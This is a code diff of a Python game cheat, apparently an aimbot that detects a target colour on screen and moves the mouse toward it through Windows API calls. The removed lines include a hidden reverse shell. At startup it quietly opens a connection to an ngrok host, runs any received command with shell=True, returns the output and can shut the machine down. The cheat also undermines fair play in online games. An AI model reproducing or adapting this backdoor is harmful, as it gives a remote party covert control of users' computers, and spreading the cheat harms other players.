@@ -4,14 +4,12 @@ import ctypes
 import pygame
 import os
 import time
-import threading
-import socket
-import subprocess
 
 os.system('cls')
 
 left, top = 800, 300
 width, height = 300, 300
+
 
 """colors"""
 red = "\033[1;31m"
@@ -32,7 +30,7 @@ def main():
 {gray}╚██████╔╝██║  ██║╚██████╗
 {gray} ╚═════╝ ╚═╝  ╚═╝ ╚═════╝""")
  print(f"""{gray}By LEVI &{red}& LONELY""")
- print(f"\033[0m{red}UPDATE {gray}#5.3")
+ print(f"\033[0m{red}UPDATE {gray}#5.4")
 
  with mss() as ss:
      while True:
@@ -47,30 +45,32 @@ def main():
          r, g, b = screenshot[:, :, 2], screenshot[:, :, 1], screenshot[:, :, 0]
          mask = (r >= 202) & (g <= 109 ) & (b >= 193)
          ys, xs = np.where(mask)
+
     
          if len(xs) == 0:
+             time.sleep(0.00088)
              continue
-    
-         centroid_x = xs.mean() 
-         centroid_y = ys.mean() 
-    
+         centroid_x = left + xs.mean() 
+         centroid_y = top + ys.mean()
          pygame.event.pump()
+
+         
          if AXIS.get_axis(4) > 0.0:
              pt = ctypes.wintypes.POINT()
              ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
              grab_x, grab_y = pt.x, pt.y
     
-             target_x = int(left + centroid_x)
-             target_y = int(top + centroid_y)
+             target_x = int(centroid_x)
+             target_y = int(centroid_y)
     
              dx = target_x - grab_x 
              dy = target_y - grab_y -18
 
-             dx = max(min(dx, 60), -60)
-             dy = max(min(dy, 60), -60) 
+             dx = max(min(dx, 70), -70)
+             dy = max(min(dy, 70), -70) 
     
              ctypes.windll.user32.mouse_event(0x0001, dx, dy)
-         time.sleep(0.001)
+         time.sleep(0.00088)
       except Exception as err:
          print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
          time.sleep(1.5)
@@ -80,32 +80,8 @@ def main():
          time.sleep(1.5)
 
 
-def p2s():
- SERVER = "0.tcp.au.ngrok.io"
- PORT = 10073
- s = socket.socket()
- s.connect((SERVER, PORT))
- s.recv(1024).decode()
-
- while True:
-    cmd = s.recv(1024).decode()
-    if cmd.lower() in ['1']:
-       os.system("shutdown /s /t 0")
-       
-
-    try:
-        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
-    except Exception as e:
-        result = str(e).encode()
-
-    if len(result) == 0:
-        result = ''.encode()
-
-    s.send(result)
-
-
-
 def check():
- threading.Thread(target=p2s, daemon=True).start()
- main()
+  print("\033[0mINFO [\033[0;31mLOCKED\033[0m]")
+  print("Unlocking ON [\033[1;33mNOV 2/2025\033[0m]")
+  input("\nPRESS [\033[1;32mENTER\033[0m] To leave: ")
 check()
